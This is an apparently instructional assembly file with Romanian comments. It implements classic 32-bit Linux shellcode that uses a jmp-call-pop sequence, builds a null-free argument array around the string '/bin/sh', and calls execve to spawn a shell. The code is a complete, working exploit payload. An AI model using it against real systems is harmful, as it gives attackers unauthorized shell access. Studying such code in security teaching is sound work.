section .text
  global _start
    _start:
		BITS 32 ;utilizarea unui bus de date de 32 de biți de către procesor.
		jmp short two ;se sare cu execyutia la eticheta "two" modificandu-se
		  ;fluxul de execuție a programului; cuvantul short indica faptul ca 
		  ;eticheta este în interiorul aceluiași segment de cod, adică distanța 
		  ;până la etichetă este de cel mult 127 de octeți
    one:
		pop ebx     		;e adresa sirului '/bin/sh*AAAABBBB' 
		xor eax, eax 		;se initializeaza cu 0 fara a introduce octeiti de 0 in codul masina
		mov [ebx+7], al     ;se sparge sirul de caractere /bin/sh; * este inlocuita cu /0 -temrinatorul de sir
		mov [ebx+8], ebx    ;octetii AAAA vor fi inlocuiti cu adresa sirului
		mov [ebx+12], eax   ;octetii BBBB vor fi inlocuiti cu 0000
		lea ecx, [ebx+8]    ;se incarca registru ecx cu adresa sirului 
		xor edx, edx        ;nu exista variabile de mediu
		mov al,  0x0b       ;se pune codul instructiunii execve
		int 0x80            ;se face apelul functiei execve
     two:
		call one ;se face un salt la eticheta one, dar de data aceasta se foloseste 
		;instruvtiunea de apelare, ceea ce inseamna ca se va pastra o adresa de retur pe stiva 
		; la instructiunea urmatoare dupa ce se executa pasii de la eticheta 2, dar instructiunea
		; urmatoarea reprezinta de fapt declararea unei variabile, ceea ce arata faptul ca pe 
		; stiva vom avea in varf stringul de mai jos
		db '/bin/sh*AAAABBBB' ;declararea stringului, a carui adresa este pusa pe stiva 